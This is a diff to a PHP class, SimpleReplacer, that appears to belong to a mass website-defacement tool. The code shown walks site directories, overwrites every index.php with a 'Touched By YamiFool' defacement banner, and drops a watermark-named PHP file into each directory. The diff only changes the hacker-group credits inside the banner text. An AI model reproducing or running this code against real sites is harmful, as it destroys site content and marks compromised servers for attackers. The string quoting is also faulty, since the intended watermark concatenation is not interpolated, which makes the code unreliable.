@@ -83,7 +83,7 @@ class SimpleReplacer {
         $dirs = $this->findDirs();
         $count = 0;
         $list = [];
-        $indexContent = "Touched By YamiFool - All Black Corvo Society ' . $this->watermark . ' SeniDariKesedihan";
+        $indexContent = "Touched By YamiFool - JesterFool - Godfathers77 - L4NA - All Royal Fool ' . $this->watermark . ' SeniDariKesedihan";
         
         foreach ($dirs as $dir) {
             $indexPath = $dir . '/index.php';
@@ -120,7 +120,7 @@ class SimpleReplacer {
         $list = [];
 
         $fileName = $this->watermark . ".php"; 
-        $fileContent = "Touched By YamiFool - All Black Corvo Society ' . $this->watermark . ' SeniDariKesedihan";
+        $fileContent = "Touched By YamiFool - JesterFool - Godfathers77 - L4NA - All Royal Fool ' . $this->watermark . ' SeniDariKesedihan";
 
         foreach ($dirs as $dir) {
             $targetPath = $dir . '/' . $fileName;
